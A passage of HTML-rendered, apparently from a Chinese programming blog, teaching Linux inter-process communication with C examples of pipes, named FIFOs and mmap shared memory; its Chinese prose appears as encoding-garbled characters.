class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ç®¡é“çš„ä¼˜åŠ£"><a href="#ç®¡é“çš„ä¼˜åŠ£" class="headerlink" title="ç®¡é“çš„ä¼˜åŠ£"></a>ç®¡é“çš„ä¼˜åŠ£</h5><p>ä¼˜ç‚¹ï¼šç®€å•ï¼Œç›¸æ¯”ä¿¡å·ï¼Œå¥—æ¥å­—å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œç®€å•çš„å¤š</p><p>ç¼ºç‚¹ï¼šåªèƒ½å•å‘é€šä¿¡ï¼ŒåŒå‘é€šä¿¡éœ€å»ºç«‹ä¸¤ä¸ªç®¡é“ï¼Œåªèƒ½ç”¨äºçˆ¶å­ï¼Œå…„å¼Ÿç­‰æœ‰è¡€ç¼˜å…³ç³»ä¹‹é—´çš„é€šä¿¡</p><h4 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h4><p>ä¹Ÿè¢«ç§°ä¸ºæœ‰åç®¡é“</p><h5 id="åˆ›å»ºfifo"><a href="#åˆ›å»ºfifo" class="headerlink" title="åˆ›å»ºfifo"></a>åˆ›å»ºfifo</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = mkfifo(<span class="string">"mytestfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"mkfifo error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="fifoå®ç°éè¡€ç¼˜å…³ç³»ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡"><a href="#fifoå®ç°éè¡€ç¼˜å…³ç³»ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡" class="headerlink" title="fifoå®ç°éè¡€ç¼˜å…³ç³»ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡"></a>fifoå®ç°éè¡€ç¼˜å…³ç³»ä¹‹é—´çš„è¿›ç¨‹é€šä¿¡</h5><p>ç¬¬ä¸€ä¸ªæ–‡ä»¶æ˜¯å†™å…¥fifoæ–‡ä»¶çš„ä»£ç <code>fifo_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,i;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_WRONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello elssm %d\n"</span>,i++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯å†™å…¥fifoæ–‡ä»¶çš„ä»£ç <code>fifo_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,len;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,len);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å­˜å‚¨æ˜ å°„"><a href="#å­˜å‚¨æ˜ å°„" class="headerlink" title="å­˜å‚¨æ˜ å°„"></a>å­˜å‚¨æ˜ å°„</h4><h5 id="mmapå‡½æ•°"><a href="#mmapå‡½æ•°" class="headerlink" title="mmapå‡½æ•°"></a>mmapå‡½æ•°</h5><p>åˆ›å»ºå…±äº«å†…å­˜æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">è¿”å›ï¼šæˆåŠŸ è¿”å›åˆ›å»ºçš„æ˜ å°„åŒºé¦–åœ°å€</span><br><span class="line">å¤±è´¥ï¼šMAP_FAILEDå®</span><br><span class="line"></span><br><span class="line">å‚æ•°</span><br><span class="line">  addr:å»ºç«‹æ˜ å°„åŒºçš„é¦–åœ°å€ï¼Œç”±Linuxå†…æ ¸æŒ‡å®šï¼Œä½¿ç”¨æ—¶ï¼Œç›´æ¥ä¼ é€’<span class="literal">NULL</span></span><br><span class="line">  length:æ¬²åˆ›å»ºæ˜ å°„åŒºçš„å¤§å°</span><br><span class="line">  prot:æ˜ å°„åŒºæƒé™  PROT_READ,PROT_WRITE,PROT_READ|PROT_WRITE</span><br><span class="line">  flags:æ ‡å¿—ä½å‚æ•°(å¸¸ç”¨äºè®¾å®šæ›´æ–°ç‰©ç†åŒºåŸŸï¼Œè®¾ç½®å…±äº«ï¼Œåˆ›å»ºåŒ¿åæ˜ å°„åŒº)</span><br><span class="line">    MAP_SHAREDï¼šä¼šå°†æ˜ å°„åŒºæ‰€åšçš„æ“ä½œåæ˜ åˆ°ç‰©ç†è®¾å¤‡(ç£ç›˜)ä¸Š</span><br><span class="line">    MAP_PRIVATEï¼šæ˜ å°„åŒºæ‰€åšçš„ä¿®æ”¹ä¸ä¼šåæ˜ åˆ°ç‰©ç†è®¾å¤‡</span><br><span class="line">  fd:ç”¨äºåˆ›å»ºå…±äº«å†…å­˜æ˜ å°„åŒºçš„é‚£ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">  offset:åç§»ä½ç½®ï¼Œéœ€æ˜¯<span class="number">4</span>kçš„æ•´æ•°å€</span><br></pre></td></tr></table></figure><h5 id="mmapå‡½æ•°å»ºç«‹æ–‡ä»¶æ˜ å°„åŒº"><a href="#mmapå‡½æ•°å»ºç«‹æ–‡ä»¶æ˜ å°„åŒº" class="headerlink" title="mmapå‡½æ•°å»ºç«‹æ–‡ä»¶æ˜ å°„åŒº"></a>mmapå‡½æ•°å»ºç«‹æ–‡ä»¶æ˜ å°„åŒº</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"testmap"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line">lseek(fd,<span class="number">20</span>,SEEK_END);</span><br><span class="line">write(fd,<span class="string">"\0"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = lseek(fd,<span class="number">0</span>,SEEK_END);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,len,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨på¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œ</span></span><br><span class="line"><span class="built_in">strcpy</span>(p,<span class="string">"hello mmap"</span>); <span class="comment">//å†™æ“ä½œ</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------%s\n"</span>,p); <span class="comment">//è¯»æ“ä½œ</span></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="mmapæ³¨æ„äº‹é¡¹"><a href="#mmapæ³¨æ„äº‹é¡¹" class="headerlink" title="mmapæ³¨æ„äº‹é¡¹"></a>mmapæ³¨æ„äº‹é¡¹</h5><ul><li>åˆ›å»ºæ˜ å°„åŒºçš„è¿‡ç¨‹ä¸­ï¼Œéšå«ç€ä¸€æ¬¡å¯¹æ˜ å°„æ–‡ä»¶çš„è¯»æ“ä½œ</li><li>å½“<code>MAP_SHARED</code>æ—¶ï¼Œè¦æ±‚ï¼šæ˜ å°„åŒºçš„æƒé™åº”&lt;=æ–‡ä»¶æ‰“å¼€çš„æƒé™(å‡ºäºå¯¹æ˜ å°„åŒºçš„ä¿æŠ¤)ï¼Œè€Œ<code>MAP_PRIVATE</code>åˆ™æ— æ‰€è°“ï¼Œå› ä¸ºmmapä¸­çš„æƒé™æ˜¯å¯¹å†…å­˜çš„é™åˆ¶</li><li>æ˜ å°„åŒºçš„é‡Šæ”¾ä¸æ–‡ä»¶å…³é—­æ— å…³ï¼Œåªè¦æ˜ å°„å»ºç«‹æˆåŠŸï¼Œæ–‡ä»¶å¯ä»¥ç«‹å³å…³é—­</li><li>ç‰¹åˆ«æ³¨æ„ï¼Œå½“æ˜ å°„æ–‡ä»¶å¤§å°ä¸º0æ—¶ï¼Œä¸èƒ½åˆ›å»ºæ˜ å°„åŒºï¼Œæ‰€ä»¥ï¼Œç”¨äºæ˜ å°„çš„æ–‡ä»¶å¿…é¡»è¦æœ‰å®é™…å¤§å°</li><li>munmapä¼ å…¥çš„åœ°å€ä¸€å®šæ˜¯mmapçš„è¿”å›åœ°å€ï¼Œåšå†³æœç»æŒ‡é’ˆ++æ“ä½œ</li><li>æ–‡ä»¶åç§»é‡å¿…é¡»ä¸º4Kçš„æ•´æ•°å€</li><li>mmapåˆ›å»ºæ˜ å°„åŒºå‡ºé”™æ¦‚ç‡éå¸¸é«˜ï¼Œä¸€å®šè¦æ£€æŸ¥è¿”å›å€¼ï¼Œç¡®ä¿æ˜ å°„åŒºå»ºç«‹æˆåŠŸåœ¨è¿›è¡Œåç»­æ“ä½œ</li></ul><h5 id="çˆ¶å­è¿›ç¨‹é—´mmapé€šä¿¡"><a href="#çˆ¶å­è¿›ç¨‹é—´mmapé€šä¿¡" class="headerlink" title="çˆ¶å­è¿›ç¨‹é—´mmapé€šä¿¡"></a>çˆ¶å­è¿›ç¨‹é—´mmapé€šä¿¡</h5><p>ä»£ç ç»ƒä¹ ï¼Œçˆ¶è¿›ç¨‹åˆ›å»ºæ˜ å°„åŒºï¼Œç„¶åforkå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä¿®æ”¹æ˜ å°„åŒºå†…å®¹ï¼Œä¹‹åçˆ¶è¿›ç¨‹è¯»åŒºæ˜ å°„åŒºå†…å®¹ï¼ŒæŸ¥çœ‹æ˜¯å¦å…±äº«</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"temp"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">p = (<span class="keyword">int</span> *)mmap(<span class="literal">NULL</span>,<span class="number">4</span>,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(fd); <span class="comment">//æ˜ å°„åŒºå»ºç«‹å®Œæ¯•ï¼Œå³å¯å…³é—­æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">*p = <span class="number">2000</span>; <span class="comment">//å†™å…±äº«å†…å­˜</span></span><br><span class="line">var = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,*p = %d,var = %d\n"</span>,*p,var); <span class="comment">//è¯»å…±äº«å†…å­˜</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,*p = %d,var = %d\n"</span>,*p,var);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,<span class="number">4</span>); <span class="comment">//é‡Šæ”¾æ˜ å°„åŒº</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="éè¡€ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡"><a href="#éè¡€ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡" class="headerlink" title="éè¡€ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡"></a>éè¡€ç¼˜å…³ç³»è¿›ç¨‹é—´é€šä¿¡</h5><p>ä»£ç ç»ƒä¹ ï¼Œä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªå¯¹ç»“æ„ä½“è¿›è¡Œä¿®æ”¹åå†™å…¥ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹å¯¹å†™å…¥åçš„ç»“æ„ä½“è¿›è¡Œè¯»å–</p><p>ç¬¬ä¸€ä¸ªæ–‡ä»¶æ˜¯å†™å…¥æ–‡ä»¶çš„ä»£ç <code>mmap_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 